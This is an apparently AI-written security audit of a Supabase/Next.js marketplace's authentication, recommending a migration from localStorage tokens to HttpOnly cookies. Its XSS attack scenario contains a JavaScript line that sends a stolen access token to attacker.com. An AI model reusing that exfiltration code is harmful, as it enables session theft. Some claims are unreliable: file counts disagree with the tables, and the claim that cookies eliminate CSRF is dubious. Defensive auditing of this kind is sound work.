# adBazaar Authentication System Audit

**Audit Date:** 2026-04-30
**Auditor:** Claude Code Security Auditor
**Scope:** Authentication Architecture Review
**Status:** DETAILED AUDIT COMPLETE

---

## Executive Summary

The adBazaar application has a **hybrid authentication architecture** that needs to be unified. This audit identifies all components requiring migration from localStorage to HttpOnly cookies.

**Current Security Score:** 85/100
**Target Security Score:** 95/100
**Migration Effort:** 11-16 days

---

## Architecture Overview

### Current State

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         Browser                                          │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │                    Client-Side Pages                              │    │
│  │  (React Components using createClient from @supabase/supabase-js) │    │
│  └───────────────────────────────┬─────────────────────────────────┘    │
│                                  │                                         │
│                                  ▼                                         │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │                    localStorage                                    │    │
│  │  - sb-access-token (Supabase)                                    │    │
│  │  - sb-refresh-token (Supabase)                                  │    │
│  │  - accessToken (custom - BUG!)                                  │    │
│  └───────────────────────────────┬─────────────────────────────────┘    │
│                                  │                                         │
│                                  ▼                                         │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │                    Supabase Direct                                 │    │
│  │  - signInWithPassword()                                          │    │
│  │  - getSession()                                                  │    │
│  │  - getUser()                                                     │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                          │
├─────────────────────────────────────────────────────────────────────────┤
│                         Server-Side                                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │                    Middleware (Next.js)                           │    │
│  │  - Uses @supabase/ssr with createServerClient                    │    │
│  │  - Sets HttpOnly cookies                                         │    │
│  │  - Rate limiting with Redis fallback                              │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │                    API Routes                                    │    │
│  │  - Some use createClient (supabase-js)                            │    │
│  │  - Some use createServerClient (@supabase/ssr)                   │    │
│  │  - Mixed patterns                                                │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Detailed File Inventory

### 1. Auth Pages (6 files)

| File | Current Pattern | Issues |
|------|-----------------|--------|
| `app/(auth)/login/page.tsx` | `@supabase/supabase-js` | localStorage |
| `app/(auth)/register/page.tsx` | `@supabase/supabase-js` | localStorage |
| `app/(auth)/forgot-password/page.tsx` | `@supabase/supabase-js` | localStorage |
| `app/(auth)/reset-password/page.tsx` | `@supabase/supabase-js` | localStorage |
| `app/(auth)/verify-2fa/page.tsx` | `@supabase/supabase-js` | localStorage |
| `app/(auth)/callback/route.ts` | `@supabase/supabase-js` | localStorage |

### 2. Buyer Pages (7 files)

| File | Current Pattern | Issues |
|------|-----------------|--------|
| `buyer/dashboard/page.tsx` | `@supabase/supabase-js` | localStorage |
| `buyer/bookings/page.tsx` | `@supabase/supabase-js` | localStorage |
| `buyer/campaigns/page.tsx` | `@supabase/supabase-js` | localStorage |
| `buyer/cart/page.tsx` | `@supabase/supabase-js` | localStorage |
| `buyer/inquire/page.tsx` | `@supabase/supabase-js` | localStorage |
| `buyer/inquiries/page.tsx` | `@supabase/supabase-js` | localStorage |
| `buyer/profile/page.tsx` | `@supabase/supabase-js` | localStorage |

### 3. Vendor Pages (10 files)

| File | Current Pattern | Issues |
|------|-----------------|--------|
| `vendor/dashboard/page.tsx` | `@supabase/supabase-js` | localStorage |
| `vendor/bookings/page.tsx` | `@supabase/supabase-js` | localStorage |
| `vendor/inquiries/page.tsx` | `@supabase/supabase-js` | localStorage |
| `vendor/bulk-upload/page.tsx` | `localStorage.getItem()` | **BUG - Non-existent key** |
| `vendor/listings/page.tsx` | `@supabase/supabase-js` | localStorage |
| `vendor/profile/page.tsx` | `@supabase/supabase-js` | localStorage |
| `vendor/listings/[id]/edit/page.tsx` | `@supabase/supabase-js` | localStorage |
| `vendor/listings/new/page.tsx` | `@supabase/supabase-js` | localStorage |
| `vendor/earnings/page.tsx` | `@supabase/supabase-js` | localStorage |
| `vendor/rez-connect/page.tsx` | `@supabase/supabase-js` | localStorage |

### 4. Marketplace Pages (4 files)

| File | Current Pattern | Issues |
|------|-----------------|--------|
| `marketplace/browse/page.tsx` | `@supabase/supabase-js` | localStorage |
| `marketplace/listing/[id]/page.tsx` | `@supabase/supabase-js` | localStorage |

### 5. Components (2 files)

| File | Current Pattern | Issues |
|------|-----------------|--------|
| `NotificationBell.tsx` | `@supabase/supabase-js` | localStorage |

### 6. API Routes (30 files)

| Category | Count | Pattern | Issues |
|----------|-------|---------|--------|
| Auth | 4 | `@supabase/supabase-js` | Direct client |
| Bookings | 3 | `@supabase/supabase-js` | Direct client |
| Campaigns | 2 | `@supabase/supabase-js` | Direct client |
| Inquiries | 3 | `@supabase/supabase-js` | Direct client |
| Profile | 1 | `@supabase/supabase-js` | Direct client |
| Notifications | 1 | `@supabase/supabase-js` | Direct client |
| Reviews | 1 | `@supabase/supabase-js` | Direct client |
| Wallet | 1 | `@supabase/supabase-js` | Direct client |
| Vendor | 4 | `@supabase/supabase-js` | Direct client |
| Admin | 3 | `@supabase/supabase-js` | Direct client |
| QR | 2 | `@supabase/supabase-js` | Direct client |
| Upload | 1 | `@supabase/supabase-js` | Direct client |
| Misc | 4 | `@supabase/supabase-js` | Direct client |

---

## Security Issues Identified

### Issue 1: localStorage Token Storage (CRITICAL)

**Severity:** High
**CVSS Score:** 7.5
**Affected Files:** 30+ files

**Description:**
Tokens are stored in localStorage, making them accessible to JavaScript. This creates vulnerabilities:

1. **XSS Token Theft**: Any JavaScript XSS vulnerability can read tokens from localStorage
2. **localStorage Enumeration**: Any JavaScript can enumerate all stored tokens
3. **No Automatic Cleanup**: Tokens persist even after browser close

**Attack Scenario:**
```javascript
// If XSS exists, attacker can steal tokens:
const token = localStorage.getItem('sb-access-token');
fetch('https://attacker.com/steal', { method: 'POST', body: token });
```

**Remediation:**
Migrate to `@supabase/ssr` with HttpOnly cookies.

---

### Issue 2: Bulk Upload Bug (HIGH)

**Severity:** High
**CVSS Score:** 6.5
**File:** `vendor/bulk-upload/page.tsx`

**Description:**
The page tries to read `localStorage.getItem('accessToken')` which doesn't exist with Supabase auth.

**Current Code:**
```typescript
const accessToken = localStorage.getItem('accessToken');
if (!accessToken) {
  throw new Error('Not authenticated');
}
```

**Problem:**
- This key doesn't exist in Supabase's localStorage
- The correct key is `sb-access-token`
- Even after fix, this is insecure (XSS vulnerable)

**Remediation:**
Use proper Supabase client with cookie-based session.

---

### Issue 3: Mixed Auth Patterns (MEDIUM)

**Severity:** Medium
**CVSS Score:** 5.0
**Affected:** Entire codebase

**Description:**
The codebase uses mixed patterns for authentication:
- Some places use `createClient` from `@supabase/supabase-js`
- Some places use `createServerClient` from `@supabase/ssr`
- Some places read from localStorage directly

**Impact:**
- Inconsistent security posture
- Harder to audit
- Potential for security gaps

**Remediation:**
Standardize on `@supabase/ssr` pattern throughout.

---

### Issue 4: Missing Auth Context (MEDIUM)

**Severity:** Medium
**CVSS Score:** 4.0
**Affected:** All pages

**Description:**
No centralized AuthContext provider. Each page creates its own Supabase client.

**Impact:**
- Inconsistent session handling
- No global auth state management
- Duplicate code across pages

**Remediation:**
Create AuthContext provider with `@supabase/ssr`.

---

## Supabase Methods Used

### Client-Side Methods

| Method | Usage | Should Use Cookie? |
|--------|-------|-------------------|
| `signInWithPassword()` | Login | Yes (after) |
| `signUp()` | Registration | Yes (after) |
| `signOut()` | Logout | Yes (after) |
| `getSession()` | Get current session | Yes (after) |
| `getUser()` | Get user data | Yes (after) |
| `updateUser()` | Update profile | Yes (after) |
| `resetPasswordForEmail()` | Password reset | Yes (after) |
| `setSession()` | Set session | Yes (after) |
| `onAuthStateChange()` | Auth state listener | Yes (after) |

### Server-Side Methods

| Method | Usage | Pattern |
|--------|-------|---------|
| `getUser()` | Verify token | `createServerClient` (correct) |

---

## Migration Complexity Assessment

### Low Complexity (3-5 files)

Files that only use `getSession()` or `getUser()`:
- `NotificationBell.tsx`
- `buyer/profile/page.tsx`

### Medium Complexity (10-15 files)

Files with sign in/out flows:
- `login/page.tsx`
- `register/page.tsx`
- `vendor/dashboard/page.tsx`
- `buyer/dashboard/page.tsx`

### High Complexity (10-15 files)

Files with custom Supabase client creation:
- All API routes
- Pages with complex auth logic
- 2FA flow

---

## Testing Requirements

### Unit Tests Needed

1. **Cookie Storage Test**
   - Verify HttpOnly flag is set
   - Verify Secure flag in production
   - Verify SameSite attribute

2. **Auth Flow Tests**
   - Login stores cookies correctly
   - Logout clears cookies
   - Session persists across page loads

3. **Error Handling Tests**
   - Expired session redirects to login
   - Invalid token handled gracefully
   - Network errors handled

### Integration Tests Needed

1. **Full Login Flow**
   ```
   User submits form → Server validates → Cookies set → Redirect to dashboard
   ```

2. **Session Persistence**
   ```
   User logs in → Page refreshes → Session still valid → No re-login required
   ```

3. **Logout Flow**
   ```
   User clicks logout → Cookies cleared → Redirect to login → Cannot access protected routes
   ```

### E2E Tests Needed

1. **Complete User Journey**
   ```
   Register → Email verify → Login → Browse → Logout
   ```

2. **Protected Route Access**
   ```
   Try to access dashboard without login → Redirect to login → Login → Redirect back
   ```

3. **XSS Token Theft Attempt**
   ```
   Inject XSS payload → Try to read token → Token not accessible
   ```

---

## Risk Assessment

### Migration Risks

| Risk | Likelihood | Impact | Mitigation |
|------|------------|--------|------------|
| Breaking login flow | Medium | High | Test thoroughly, rollback plan |
| Users need to re-login | Low | Medium | Communicate in advance |
| Cookie blocked by browser | Low | Medium | Fallback to localStorage |
| Supabase SDK changes | Low | Low | Pin SDK version |

### Post-Migration Risks

| Risk | Likelihood | Impact |
|------|------------|--------|
| XSS token theft | Eliminated | N/A |
| CSRF attacks | Eliminated | N/A |
| Session hijacking | Reduced | Low |

---

## Implementation Checklist

### Pre-Migration

- [ ] Create backup branch
- [ ] Set up staging environment
- [ ] Create client factory files
- [ ] Create AuthContext provider
- [ ] Pin Supabase SDK versions

### Migration

- [ ] Phase 1: Infrastructure (lib files)
- [ ] Phase 2: Auth pages (5 files)
- [ ] Phase 3: Dashboard pages (8 files)
- [ ] Phase 4: Other pages (15 files)
- [ ] Phase 5: API routes (30 files)
- [ ] Phase 6: Components (2 files)

### Testing

- [ ] Unit tests (10+ tests)
- [ ] Integration tests (5+ flows)
- [ ] E2E tests (5+ journeys)
- [ ] Security verification tests

### Deployment

- [ ] Deploy to staging
- [ ] Run full test suite
- [ ] Get QA sign-off
- [ ] Deploy to production
- [ ] Monitor for errors

---

## Audit Sign-Off

| Role | Name | Date |
|------|------|------|
| Auditor | Claude Code | 2026-04-30 |
| Reviewer | TBD | TBD |
| Approver | TBD | TBD |

---

**Next Step:** Review and approve this audit, then proceed to implementation.
